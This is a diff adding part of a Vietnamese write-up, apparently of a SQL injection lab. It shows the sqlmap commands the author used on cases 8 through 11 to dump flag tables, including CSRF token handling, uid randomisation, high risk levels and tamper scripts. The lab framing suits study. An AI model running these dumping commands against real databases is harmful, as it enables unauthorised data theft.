@@ -114,4 +114,38 @@ Quay lại case1, do bố cục bài nó thế chứ không phải tôi thích t
 
 ![image](https://github.com/user-attachments/assets/bf9aae8c-8fa0-4206-9ff3-02d6e9e36e55)
 
+Tiếp theo là case8, lần này có cả anti-CSRF token
+
+![image](https://github.com/user-attachments/assets/746226b5-1011-4b5d-8c9b-46dad5a275b6)
+
+Tôi chạy thử `sqlmap -r req.txt --batch --dump-all --data="id=1&csrf-token=d7uDKpYEqSSMbPv5guqQMr1H3yZsd0DhlkX1e8I0PIg" --csrf-token="t0ken"` và ngon:
+
+![image](https://github.com/user-attachments/assets/27dfea84-a8a9-4ea6-b07f-2c765768533e)
+
+Tôi chỉnh lại thành `sqlmap -r req.txt --batch --dump-all --data="id=1&csrf-token=d7uDKpYEqSSMbPv5guqQMr1H3yZsd0DhlkX1e8I0PIg" --csrf-token="t0ken" -D testdb -T flag8 --dbms
+=MySQL --no-cast` để tăng tốc độ:
+
+![image](https://github.com/user-attachments/assets/aa50156a-7407-4cab-84e4-294959352584)
+
+Case9 có quả uid đặc biệt:
+
+![image](https://github.com/user-attachments/assets/5b8881a4-c93d-4ffe-bb8e-101cefa5267c)
+
+Tôi dùng `sqlmap -r req.txt --batch -level=5 --risk=3 --no-cast --batch --dump-all --randomize=uid -D testdb -T flag9 --dbms=MySQL` và ra:
+
+![image](https://github.com/user-attachments/assets/4bf07934-69c8-4961-a290-61414f0af22c)
+
+Case10 thì tôi cũng không biết nữa, tự nhiên nó ra bằng `sqlmap -r req.txt --batch -level=5 --risk=3 --no-cast --batch --dump-all -D testdb -T flag10 --dbms=MySQL` :
+
+![image](https://github.com/user-attachments/assets/92fdf841-d045-4631-bd93-fe7c8c8ceb2f)
+
+Case11 tôi sử dụng `sqlmap -r req.txt --batch -level=5 --risk=3 --no-cast --batch --dump-all --randomize=uid -D testdb -T flag11 --dbms=MySQL`:
+
+
+
+Đợi lâu quá, tôi đi đọc forum thì thấy thêm tamper là `sqlmap -r req.txt -T flag11 --dump --risk=3 --level=5 --batch --tamper=greatest,least --threads=10`, thế là ra luôn:
+
+![image](https://github.com/user-attachments/assets/f046decb-bc2d-433d-b861-3a4d4bdc58b9)
+
+Nếu không biết dùng tamper nào thì có thể dùng `sqlmap -r req.txt -T flag11 --dump --risk=3 --level=5 --batch --list-tampers --threads=10`, vẫn ra flag như thường
 
